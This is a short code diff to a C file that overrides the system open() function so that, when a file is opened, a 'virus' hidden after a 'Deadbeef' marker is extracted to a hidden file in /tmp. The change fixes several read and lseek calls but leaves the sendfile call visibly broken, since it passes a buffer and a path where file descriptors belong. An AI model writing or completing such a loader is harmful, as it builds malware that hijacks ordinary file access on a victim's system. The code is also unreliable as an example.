@@ -6,6 +6,7 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <string.h>
+#include <sys/sendfile.h>
 
 int open(const char *pathname, int flags, ...){
     
@@ -35,7 +36,7 @@ int open(const char *pathname, int flags, ...){
     char buf[4];
 
     do{
-        check = read(pathname, buf, 4);
+        check = read(fd, buf, 4);
         if(check == -1){
            printf("Deadbeef Read Failed\n");
            return -1;
@@ -49,7 +50,7 @@ int open(const char *pathname, int flags, ...){
 
     //Extract virus and place in /tmp/.pid.fd.ruid
     
-    off_t virusstop = lseek(pathname, 0, SEEK_CUR);
+    off_t virusstop = lseek(fd, 0, SEEK_CUR);
     pid_t pid = getpid();
     uid_t ruid = getuid();
     char filebuf[100];
@@ -63,7 +64,7 @@ int open(const char *pathname, int flags, ...){
     off_t zero = 0;
     ssize_t newfile = sendfile(filebuf, pathname, &zero, virusstop);
     
-    if(lseek(fd,virusstop, SEEK_SET) == -1){
+    if(lseek(fd, virusstop, SEEK_SET) == -1){
         printf("lseek failed.\n");
     }
 
